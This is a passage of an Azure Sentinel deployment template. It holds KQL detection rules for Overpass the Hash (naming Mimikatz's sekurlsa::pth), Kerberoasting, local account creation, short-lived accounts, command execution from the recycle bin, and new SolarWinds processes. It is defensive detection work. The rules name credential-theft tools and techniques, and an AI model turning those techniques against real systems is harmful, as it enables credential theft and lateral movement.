\n  bv_start_time\n  , bv_end_time\n  , bv_alert_time = now()\n  , bv_dest_user\n  , bv_src_user\n  , VictimEntity\n  , AttackerEntity\n  , bv_process_name\n  , bv_src_dvc_cnt\n  , ExtendedDescription\n  , bv_src_user_1\n  , bv_src_dvc_1 \n  , bv_src_dvc\n  , RBAScore = 3\n  , Class\n  , Tags\n  , bv_mapping_tag = bv_src_user",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "LateralMovement"
          ],
          "techniques": [
            "T1550"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Detects successful logon with logon type 9 (NewCredentials) which matches the Overpass the Hash behavior of e.g Mimikatz''s sekurlsa::pth module.\n\n{{ExtendedDescription}}\n\nMITRE: T1075 Category: Windows Security {{Tags}}"
          },
          "customDetails": {
            "RBAScore": "RBAScore",
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_dvc_1"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user_1"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-147')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-147')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-147: [RBA] Windows - Local User Account Created",
          "description": "Identifies when a user account has been created. A local account is considered an account that is not part of the Windows AD domain(s) set in the AD_DOMAINS constant. MITRE: T1098 Category: Windows Security Events tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 10m;\nlet latency = 10m;\nlet alert_bin = 10m;\nlet end_time = now();\nlet EventIDList = dynamic([4720]);\nlet global_config = dynamic({\n  'RBASCORE':0,\n  'EXCLUSION': dynamic([{}])\n});\nlet exclusions = array_concat(global_config['EXCLUSION'], BV147_CONFIG['EXCLUSION'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV147_CONFIG['RBASCORE']),real(0.0));\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId | extend bv_rule_version = '1.1.5185'\n| extend bv_rule_timestamp = '1713382279.9779184'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.5185 bv_rule_timestamp: 1713382279.9779184'\n| project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n    let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId | extend bv_rule_version = '1.1.5185'\n| extend bv_rule_timestamp = '1713382279.9779184'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.5185 bv_rule_timestamp: 1713382279.9779184'\n| project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n    table_parameter\n    | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n    | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n    | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n    | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n    | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n    | extend ModifiedRBAScore = case(\n      ModifiedRBAScore > 10, 10.0\n      , ModifiedRBAScore <0.1, 0.1\n      , ModifiedRBAScore\n    )\n    | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet description = (table_parameter: (*)){\n  table_parameter\n  | extend all_data = pack_all(false)\n  | extend keys = bag_keys(all_data)\n  | mv-apply k = keys to typeof(string) on (\n      extend dynamic_entity = parse_json(all_data[k])\n      | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw',strcat(\n      case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n      , strcat(k,': ', all_data[k])\n      )\n      ),'')\n      | summarize ExtendedDescription = make_set(ExtendedDescription), k = make_set(k)\n  )\n  | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet exclusion_filter = (table_parameter: (*)){\n      table_parameter\n      | extend all_data = pack_all()\n      | mv-apply e = exclusions on (\n          extend keys = bag_keys(e)\n          | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n          | mv-apply k = keys to typeof(string) on (\n              extend list = split(e[k],',')\n              | mv-apply l = list to typeof(string) on (\n                  extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                  | mv-apply i = item to typeof(string) on (\n                      extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                      | summarize excluded_count = countif(compare)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_count = countif(item_excluded)\n                  | extend item_excluded = excluded_count > 0\n              )\n              | summarize excluded_list_item = countif(item_excluded > 0)\n          )\n          | extend exclusion_matched =  key_count == excluded_list_item and key_count != 0\n          | extend visibility = iff(isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n          | extend bv_exclusion_reason = iff(exclusion_matched, parse_json(e.metadata).reason, '')\n          | summarize exclusion_matched=make_set(exclusion_matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n      )\n      | extend drop_event = iff(exclusion_matched contains \"true\", true, false)\n      | where not(drop_event)\n};\nbv_parser_security_event\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where SubjectUserName !endswith \"$\"\n| parse SubjectAccount with SubjectDomain '\\\\' SubjectUser\n//' comment to fix syntax highlighting\n| parse TargetAccount with TargetDomain '\\\\' TargetUser\n//' comment to fix syntax highlighting\n| where Computer has TargetDomain and TargetDomain !in~ (AD_DOMAINS) and 'ADDOMAIN' !in~ (AD_DOMAINS)\n| extend bv_rule_version = '1.1.5185'\n| extend bv_rule_timestamp = '1713382279.9779184'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.5185 bv_rule_timestamp: 1713382279.9779184'\n| project \n    bv_user = TargetUserName\n    , bv_user_id = TargetUserSid\n    , bv_src_user = SubjectUserName\n    , bv_src_user_id = SubjectUserSid\n    , bv_object = TargetUserName\n    , bv_object_id = TargetUserSid\n    , bv_object_category = 'user'\n    , bv_change_action = 'create'\n    , bv_start_time = TimeGenerated\n    , bv_src_dvc = Computer\n    , bv_alert_time = now()\n    , bv_vendor_product = 'Windows'\n    , sourcetype = 'bv_parser_security_event'\n| extend bv_tuning_target = tolower(bv_cim_normalize_username(bv_src_user))\n| where bv_tuning_target !in~ (AUTHORIZED_ADMINS_V2)\n| project-away bv_tuning_target \n| invoke exclusion_filter()\n| invoke rba_score_calculator('BV-147')\n| invoke description()\n| extend bv_alarm_victim_entities = pack_array(bv_object)\n| extend bv_alarm_attacker_entities = pack_array(bv_src_user)\n| extend bv_rule_version = '1.1.5185'\n| extend bv_rule_timestamp = '1713382279.9779184'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.5185 bv_rule_timestamp: 1713382279.9779184'\n| project-keep\n    bv_*\n    , sourcetype\n    , ExtendedDescription   ",
          "queryFrequency": "PT10M",
          "queryPeriod": "PT20M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "InitialAccess",
            "PrivilegeEscalation",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-147: [RBA] Windows - {{bv_src_user}} created {{bv_object}} account locally",
            "alertDescriptionFormat": "This alert notifies when a local account has been created\n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: Windows Security\nMITRE: T1136 MITRE: T1078\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_user"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-144')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-144')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-144: [RBA] Windows Command Execution detected from the local recycle bin",
          "description": "Identifies process execution from the recycle bin. References: https://azure.microsoft.com/en-us/blog/how-azure-security-center-helps-reveal-a-cyberattack/. MITRE: T1074 Category: Windows Security CommandLine Audited tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4688']);\nlet start_time = 24h;\nlet latency = 1h;\nlet end_time = now();\nlet ProcessCreationEvents=() {\nlet processEvents=bv_parser_security_event\n| where EventID in (EventIDList)\n| project TimeGenerated, ComputerName = Computer, AccountName=SubjectUserName, AccountDomain=SubjectDomainName,\nFileName=tostring(split(NewProcessName, @'\\')[-1]), ProcessCommandLine = CommandLine, InitiatingProcessFileName = ParentProcessName, \nInitiatingProcessCommandLine = '', InitiatingProcessParentFileName = '';\nprocessEvents};\nProcessCreationEvents \n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where FileName in~ ('cmd.exe','ftp.exe','schtasks.exe','powershell.exe','rundll32.exe','regsvr32.exe','msiexec.exe')\n| where (ProcessCommandLine contains @'$recycler') or (ProcessCommandLine contains @'$recycle.bin')\n| extend ExtendedDescription = strcat('User account ', AccountName, ' executed a command from the recycling bin on system ', ComputerName, '. The command executed was ', ProcessCommandLine)\n| extend AttackerEntity = pack_array(AccountName)\n| extend VictimEntity = pack_array(ComputerName)\n| project ExtendedDescription, StartTimeUtc = TimeGenerated, ComputerName, AccountName, ProcessCommandLine, InitiatingProcessFileName, AttackerEntity, VictimEntity, RBAScore = 3",
          "queryFrequency": "P1D",
          "queryPeriod": "PT25H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection"
          ],
          "techniques": [
            "T1074"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies process execution from the recycle bin.\n\n{{ExtendedDescription}}\n\nMITRE: T1074 \nCategory: Windows Security CommandLine Audited\ntag: RBA"
          },
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "ComputerName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-143')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-143')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-143: [SOC] Windows - Potential Kerberoasting",
          "description": "An attacker can try requesting Kerberos ticket-granting service (TGS) service tickets for any SPN \nfrom a domain controller (DC) which contains a hash of the Service account. \nThis can then be used for offline cracking. This hunting query looks for accounts that are \ngenerating excessive requests to different resources within a small window of time the last hour \nout of the previous 24 hours. Normal users wouldn't make unusually large number of request within a small time window. \nThis is based of 4769 events which can be very noisy so environment based tweaking might be needed. MITRE: T1558 Category: Windows Security Events tag: SOC",
          "severity": "Medium",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4769']);\nlet start_time = 1h;\nlet start_time_historical = 1d;\nlet end_time = now();\nlet app_count_min_threshold = 4;\nlet app_count_max_threshold = 15;\nlet Kerbevent = (\n    bv_parser_security_event\n    | where TimeGenerated between (ago(start_time_historical) .. end_time) and ingestion_time() > ago(start_time_historical)\n    | where EventID in (EventIDList)\n    | parse EventData with * 'TicketEncryptionType\">' TicketEncryptionType '<' *\n    | parse EventData with * 'IpAddress\">::ffff:' bv_src_ip '<' *\n    | parse EventData with * 'ServiceName\">' bv_dest_app '<' *\n    | parse EventData with * 'ServiceSid\">' bv_dest_app_id '<' *\n    | parse EventData with * 'Status\">' bv_vendor_result '<' *\n    | parse EventData with * 'TargetUserName\">' bv_dest_user '<' *\n    | parse EventData with * 'TicketOptions\">' TicketOptions '<' *\n    | parse EventData with * 'LogonGuid\">' bv_alert_id '<' *\n    | where TicketOptions =~ '0x40810000'\n    | where bv_vendor_result =~ '0x0'\n    | where TicketEncryptionType =~ '0x17'\n    | where bv_dest_user !contains '$@'\n    | where bv_dest_user !contains bv_dest_app\n    | where bv_dest_app !contains '$'\n    | where bv_dest_app !contains 'krbtgt'\n    | extend \n          bv_src_dvc = Computer\n          , bv_start_time = TimeGenerated\n    | project-keep\n      bv_*\n);\nlet Kerbevent_historical = (\n    Kerbevent\n    | where bv_start_time between (ago(start_time_historical) .. ago(start_time))        \n    | summarize \n          bv_dest_app_count_historical = dcount(bv_dest_app)\n          , bv_dest_app_historical = make_set(bv_dest_app) \n      by \n          bv_src_dvc\n          , bv_dest_user\n          ,  bv_src_ip\n    | where bv_dest_app_count_historical < app_count_min_threshold\n);\nKerbevent\n    | where bv_start_time > ago(start_time)\n    | summarize \n              bv_start_time = min(bv_start_time)\n              , bv_end_time = max(bv_start_time)\n              , bv_dest_app_count = dcount(bv_dest_app)\n              , bv_dest_app = make_set(bv_dest_app, 5) \n          by \n              bv_src_dvc\n              , bv_dest_user\n              , bv_src_ip\n  | join kind = leftanti Kerbevent_historical on bv_dest_user\n  | where bv_dest_app_count > app_count_max_threshold\n  | mv-apply e = BV143_CONFIG['EXCLUSION'] on (\n          extend keys = bag_keys(e)\n          | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n          | extend bv_src_dvc_excluded = iff(bv_src_dvc contains e.bv_src_dvc and isnotempty(e.bv_src_dvc), 1, 0)\n          | extend bv_dest_user_excluded = iff(bv_dest_user contains e.bv_dest_user and isnotempty(e.bv_dest_user), 1, 0)\n          | extend bv_src_ip_excluded = iff(bv_src_ip contains e.bv_src_ip and isnotempty(e.bv_src_ip), 1, 0)\n          | extend bv_dest_app_excluded = iff(bv_dest_app contains e.bv_dest_app and isnotempty(e.bv_dest_app), 1, 0)\n          | extend excluded_count = \n                  bv_src_dvc_excluded\n                  + bv_dest_user_excluded         \n                  + bv_src_ip_excluded            \n                  + bv_dest_app_excluded     \n          | extend transparent = iff(isnotempty(e.metadata[\"transparent\"]), e.metadata[\"transparent\"], true)\n          | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n          | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n          | summarize excluded=make_set(excluded), transparent=countif(transparent), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n  )\n  | extend ExcludedEvent = iff(excluded contains 'true', true, false)\n  | where ExcludedEvent == false\n  | extend RBAScore = BV143_CONFIG['RBASCORE']\n  | extend ExtendedDescription = strcat(\n          'bv_src_dvc: ', bv_src_dvc, '\\n' \n          , 'bv_dest_user: ', bv_dest_user, '\\n' \n          , 'bv_src_ip: ', bv_src_ip, '\\n' \n          , 'bv_dest_app_count: ', bv_dest_app_count, '\\n' \n          , 'bv_dest_app: \\n* ', strcat_array(bv_dest_app, '\\n* '), '\\n\\n' \n          , 'RBAScore: ', RBAScore)\n  | parse bv_dest_user with bv_dest_user_name '@' bv_dest_user_domain\n  | parse bv_dest_user with bv_dest_user_domain1 @\"\\\\\" bv_dest_user_name1\n  | extend VictimEntity = pack_array(coalesce(bv_dest_user_name, bv_dest_user_name1, bv_dest_user))\n  | extend AttackerEntity = pack_array(bv_src_ip)\n  | extend bv_mapping_tag = bv_dest_user\n  | project-keep\n      bv_*\n      , RBAScore\n      , VictimEntity\n      , AttackerEntity\n      , ExtendedDescription",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1558"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies potential kerberroasting on a specific user account.\n\n{{ExtendedDescription}}\n\nMITRE: T1558 \nCategory: Windows Security\ntag: SOC  "
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity",
            "RBAScore": "RBAScore",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_dest_user"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-142')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-142')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-142: [RBA] User account created and deleted within 8 hours",
          "description": "Identifies when a user account is created and then deleted within 8 hours. This can be an indication of compromise and an adversary attempting to hide in the noise. MITRE: T1098,T1078 Category: Windows Security Events tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4720', '4726']);\nlet ingested_lookback = 9h; // earliest [ingest time] boundary\nlet generated_lookback = 1d; // earliest [log time] boundary\nlet duration = 8; //8 hours\nbv_parser_security_event\n| where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n// A user account was created\n| where EventID == EventIDList[0]\n| where AccountType =~ 'User'\n| summarize creationTime = min(TimeGenerated) by EventID, Activity, Computer, TargetUserName, UserPrincipalName, SubjectUserName, TargetSid, SubjectUserSid\n| project creationTime, CreateEventID = EventID, Activity, Computer, TargetUserName, UserPrincipalName,\n    AccountUsedToCreate = SubjectUserName, TargetSid, SubjectUserSid\n| join kind= inner (\n    bv_parser_security_event\n    | where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n    // A user account was deleted\n    | where EventID == EventIDList[1]\n    | where AccountType == 'User'\n    | summarize deletionTime = max(TimeGenerated) by EventID, Activity, Computer, TargetUserName, UserPrincipalName, SubjectUserName, TargetSid, SubjectUserSid\n    | project deletionTime, DeleteEventID = EventID, Activity, Computer, TargetUserName, UserPrincipalName,\n        AccountUsedToDelete = SubjectUserName, TargetSid, SubjectUserSid\n    )\n    on Computer, TargetUserName\n      | extend bv_alarm_victim_entities = pack_array(TargetUserName)\n      | extend bv_alarm_attacker_entities = pack_array(AccountUsedToCreate)\n| extend TimeDelta = datetime_diff('hour', deletionTime, creationTime)\n| where TimeDelta <= duration\n| project\n    TimeDelta,\n    creationTime,\n    CreateEventID,\n    Computer,\n    TargetUserName,\n    UserPrincipalName,\n    AccountUsedToCreate,\n    deletionTime,\n    DeleteEventID,\n    AccountUsedToDelete\n    , bv_alarm_victim_entities\n    , bv_alarm_attacker_entities",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1098",
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "TargetUserName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-141')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-141')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-141: [RBA] Windows - User account created and disabled within 10 mins",
          "description": "Identifies when a user account is created and then disabled within 10 minutes. This can be an indication of compromise and an adversary attempting to hide in the noise. MITRE: T1098,T1078 Category: Windows Security Events tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4720', '4725']);\nlet timeframe = 1d;\nlet spanoftime = 10m;\nlet threshold = 0;\nbv_parser_security_event \n| where TimeGenerated > ago(2*timeframe) \n// A user account was created\n| where EventID == EventIDList[0]\n| where AccountType =~ 'User'\n| project creationTime = TimeGenerated, CreateEventID = EventID, Activity, Computer, TargetUserName, UserPrincipalName, \nAccountUsedToCreate = SubjectUserName, TargetSid, SubjectUserSid \n| join kind= inner (\n    bv_parser_security_event\n    | where TimeGenerated > ago(timeframe) \n    // A user account was deleted \n    | where EventID == EventIDList[1]\n| where AccountType == 'User'\n| project deletionTime = TimeGenerated, DeleteEventID = EventID, Activity, Computer, TargetUserName, UserPrincipalName, \nAccountUsedToDelete = SubjectUserName, TargetSid, SubjectUserSid \n) on Computer, TargetUserName\n| where deletionTime - creationTime < spanoftime\n| extend TimeDelta = deletionTime - creationTime\n| where tolong(TimeDelta) >= threshold\n| project TimeDelta, creationTime, CreateEventID, HostCustomEntity =Computer, TargetUserName, UserPrincipalName, AccountCustomEntity = AccountUsedToCreate, \ndeletionTime, DeleteEventID, AccountUsedToDelete",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1098",
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-135')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-135')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-135: [RBA] Windows - Computers Running SolarWinds",
          "description": "Create alert to detect new computers running SolarWinds apps in the last 24 hours vs. last 7 days MITRE: T1543 Category: Windows Security Events tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4688']);\nlet shorttimeframe = ago(1d); \n            let longtimeframe = ago(7d);\n            let endtimeframe = now(); \n            bv_parser_security_event \n            | where TimeGenerated between (shorttimeframe .. endtimeframe)\n            | where tolower(NewProcessName) has 'solarwinds'  \n            | extend MachineName = Computer, Process = NewProcessName\n            | where MachineName !in~ (A135_EXCLUDED_HOSTS)\n            | join kind=leftanti (bv_parser_security_event \n                | where TimeGenerated between (longtimeframe .. shorttimeframe) \n                | where EventID in (EventIDList)\n                | where tolower(NewProcessName) has 'solarwinds'  \n                | extend MachineName = Computer, Process = NewProcessName)\n                on Process, MachineName\n            | summarize StartTime = min(TimeGenerated), \n                        EndTime = max(TimeGenerated) \n              by Process, \n                 Type, \n                 HostCustomEntity = MachineName, \n                 AccountCustomEntity = Account",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1543"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
